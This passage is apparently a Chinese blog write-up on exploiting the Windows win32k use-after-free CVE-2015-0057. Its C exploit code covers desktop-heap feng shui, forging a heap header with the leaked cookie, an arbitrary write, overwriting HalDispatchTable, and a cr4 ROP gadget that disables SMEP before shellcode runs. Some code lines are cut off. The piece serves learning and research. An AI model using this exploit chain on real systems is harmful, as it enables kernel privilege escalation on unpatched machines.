            hookflag = 0;
            DebugBreak();
            DestroyWindow(hwnd);
            DebugBreak();
            for (int i = 0; i  dt !_THRDESKHEAD
    win32k!_THRDESKHEAD
    +0x000 h                : Ptr64 Void
    +0x008 cLockObj         : Uint4B
    +0x010 pti              : Ptr64 tagTHREADINFO
    +0x018 rpdesk           : Ptr64 tagDESKTOP
    +0x020 pSelf            : Ptr64 UChar
这个结构体内很多指针都不能被破坏，但是我们并不能完全的控制 0x10 字节的数据，这是个麻烦的问题，不仅这个结构，就算可以越界到 `strName`
我们也只能完全控制前 0x8 个字节，`Buffer`
指针只能部分控制。那么我们就不能直接这样越界写，得想其他路子。这里我们将注意力转移到另外一个结构体，内核的堆块有其本身的结构，可以称为 heap
的元数据也可以叫堆头，在桌面堆中这个结构叫做 _HEAP_ENTRY，主要用来堆内存的管理，标识堆块的大小与是否空闲的状态，它的定义如下：
    kd> dt !_HEAP_ENTRY
    ntdll!_HEAP_ENTRY
        +0x000 PreviousBlockPrivateData : Ptr64 Void
        +0x008 Size             : Uint2B    => 当前堆块大小
        +0x00a Flags            : UChar        => 表示是否空闲
        +0x00b SmallTagIndex    : UChar        => 检测是否被覆盖
        +0x00c PreviousSize     : Uint2B    => 前一个堆块大小
        +0x00e SegmentOffset    : UChar
        +0x00f UnusedBytes      : UChar
有关堆头结构的详细介绍可以查看这篇文章 [Leviathan blog
entry](https://www.leviathansecurity.com/blog/understanding-the-windows-allocator-a-redux/)，堆头是 0x10 字节大小，前 8 字节如果有对齐的需要就存放上一个堆块的数据，size 域和 prevsize
域存放的是本来数值除以 0x10，Flags 域用来表示当前堆块是空闲状态还是使用状态，SmallTagIndex
域则是用来做安全检查的，存放一个异或加密过的值就像 stack cookie 那样检测是否有溢出。
虽然不能直接覆盖 strName.Buffer，但是我们可以拿 _HEAP_ENTRY 开刀，而且 SetPROP
刚好可以完全控制下一个堆块_HEAP_ENTRY 关键的数据结构，修改它的大小让其包含 tagWND 结构，然后释放掉它再分配一个 tagPROP +
tagWND 大小的堆块，这样我们就可以控制堆块的内容来修改 tagWND。现在调整一下风水布局，和 Ncc Group 的略有不同，用 window
text 结构可以任意分配内存大小，这样更为方便，新的堆布局如下：
触发 uaf 后 tagSBINFO 位置处会被替换成 tagPROPLIST 结构，然后调用 setPROP 修改相邻 window text 的
_HEAP_ENTRY 将其 size 域覆盖成 sizeof(overlay1) + sizeof(tagWND) +
sizeof(_HEAP_ENTRY)，然后释放掉，分配一个 window text 来操作里面的数据。
现在我们能用任何想要的数据覆盖 strName.Buffer 的指针，虽然 tagWND
的其他数据需要修复，不过这可以从用户空间读取，桌面堆会映射到用户空间，准备好 tagWND 的全部数据，把 Buffer
指针的值修改成目的地址，然后申请这部分内存。
堆内存的预期布局我们已经设计好，后面就是具体的实施了，一共需要三组 tagWND，先初始化用来占位的一组和用来设置 tagPROP 的一组：
    for (int i = 0; i aheList;
        while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
        {
            if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
            {
                if ( *(UINT *)((BYTE *)MemInfo.BaseAddress + 0x10) == 0xffeeffee )
                {
                    if (*(ULONG_PTR *)((BYTE *)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE *)MemInfo.BaseAddress + deltaDHeap))
                    {
                        xorKey.append( (CHAR*)((BYTE *)MemInfo.BaseAddress + 0x80), 16 );
                        return TRUE;
                    }
                }
            }
            Addr += MemInfo.RegionSize;
        }
        return FALSE;
    }
我们直接拿来用就好了，原理也是从桌面堆映射到用户空间的内存里取出 cookie 的值，然后构造好 size、prevsize、small tagIndex
之后整串字符和 cookie 值异或完就可以放上去了。
    memset(o2str, 'x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
    *(DWORD *)o2str = 0x00000000;
    *(DWORD *)(o2str + 4) = 0x00000000;
    *(DWORD *)(o2str + 8) = 0x00010000 + OVERLAY2_SIZE;
    *(DWORD *)(o2str + 12) = 0x10000000 + ((OVERLAY1_SIZE + TAGWND_SIZE + _HEAP_BLOCK_SIZE) / 0x10);
    string clearh, newh;
    o2str[11] = o2str[8] ^ o2str[9] ^ o2str[10];
    clearh.append(o2str, 16);
    newh = XOR(clearh, xorKey);
    memcpy(o2str, newh.c_str(), 16);
    RtlInitLargeUnicodeString(&o2lstr, (WCHAR*)o2str, (UINT)-1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
## Code Execution
现在控制了 strName.Buffer 也就可以任意地址写了，后面的利用的套路都是通用的，可以用这个写操作原语覆盖 nt!HalDispatchTable
的第二项，然后在用户态调用 NtQueryInternalProfile() 函数，然后内核中会执行
nt!KeQueryIntervalProfile，该函数中有这样一个代码片段
调用了 HalDispatchTable 偏移 0x8 地址处的函数，我们把这个地址处的函数替换成任意地址的代码。可以在用户态调用
NtQuerySystemInformation() 来获取模块信息，这些信息中就包含模块基址，然后通过基址计算出 HalDispatchTable
在内核中的地址。
    rc = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, 0x100000, NULL);
得到代码执行是不是就万事大吉了呢？实际上我们还有一些缓解措施需要绕过，第一个要解决的就是 SMEP，它阻止我们在用户空间以内核权限执行代码，这使得修改
nt!HalDispatchTable 的列表项，使其指向用户空间地址变得不可用了。不过我们可以用 ROP
绕，先跳转到内核空间的的某个可控制的位置，在该位置上的代码能修改 cr4 寄存器的值以关闭
SMEP，这样就能跳转到用户空间执行代码了。我们可以在内核空间找到这样一处代码：
    kd> u fffff802`005f97cc
        nt!KiConfigureDynamicProcessor+0x40:
        fffff802`005f97cc 0f22e0          mov     cr4,rax
        fffff802`005f97cf 4883c428        add     rsp,28h
        fffff802`005f97d3 c3              ret
cr4 是决定 SMEP 的关键寄存器，将 cr4 第20位 bit 设置位 0，cr4 的值为 0x406f8，然后返回地址用 shellcode
地址传参压入栈中，完美的跳转执行了 shellcode。
    ULONG_PTR newcr4 = 0x406f8;
    NtQueryIntervalProfile(shellcodeaddress, (PULONG)&newcr4);
最终结果验证
完整的漏洞利用代码在 [github](https://github.com/0x3f97/windows-kernel-exploit/tree/master/cve-2015-0057) 上。
## Summary
整个分析过程耗时非常之久（卒，总是想要弄清楚漏洞的每个细节，从漏洞成因到触发漏洞边看资料边调都花了大量时间，然后一直到 stage2 调整堆风水覆盖
strBuffer 的阶段，我从一边写记录一边调利用转向了完全专注于利用的开发，其实我只做了堆风水布局的调整，其他部分像内核地址的泄露、shellcode
的执行都是照抄已有的 exp 代码（逃。虽然我现在的进度很慢，我还是会尽最大努力继续学习 win kernel，向 wjllz
师傅还有其他很多都很厉害的师傅学习QvQ ！
## Reference
  * 漏洞发现者 Udi Yavo of enSilo 的 [分析](https://blog.ensilo.com/one-bit-to-rule-them-all-bypassing-windows-10-protections-using-a-single-bit)
  * Ncc group 详细利用分析的 [writeup](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/july/exploiting-the-win32kxxxenablewndsbarrows-use-after-free-cve-2015-0057-bug-on-both-32-bit-and-64-bit-tldr/)
  * [windows 内核系列二: cve-2015-0057 ==> DDCTF kernel pwn第二题](https://bbs.pediy.com/thread-247281.htm)
  * win8.1 x64 下完整利用 [[MS15-010 / CVE-2015-0057] EXPLOITATION](http://hdwsec.fr/blog/20151217-ms15-010/)